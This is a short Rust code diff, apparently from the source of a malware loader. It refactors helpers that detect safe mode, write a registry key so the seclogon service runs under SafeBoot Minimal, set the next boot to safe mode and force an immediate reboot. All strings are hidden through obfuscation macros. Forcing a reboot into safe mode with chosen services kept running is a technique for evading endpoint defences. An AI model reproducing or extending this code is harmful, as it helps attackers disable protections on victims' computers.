@@ -2,7 +2,7 @@ use std::{ env, path::PathBuf };
 use anyhow::Result;
 use loader_vars::constants::loader_service_name;
 use obfstr::obfstr as s;
-use shared::utils::functions::spawn_program;
+use shared::utils::functions::{ restart_pc_instant, spawn_program };
 
 pub fn is_safe_mode() -> bool {
     match env::var(s!("SAFEBOOT_OPTION")) {
@@ -47,10 +47,6 @@ pub fn register_seclogon_for_safemode() -> Result<()> {
         s!("REG"),
         Some(s!(r#"ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\seclogon" /f"#))
     )
-}
-
-pub fn restart_pc_instant() -> Result<()> {
-    spawn_program(s!("shutdown"), Some(s!(r#"/r /f /t 0"#)))
 }
 
 pub fn set_next_boot_safemode() -> Result<()> {
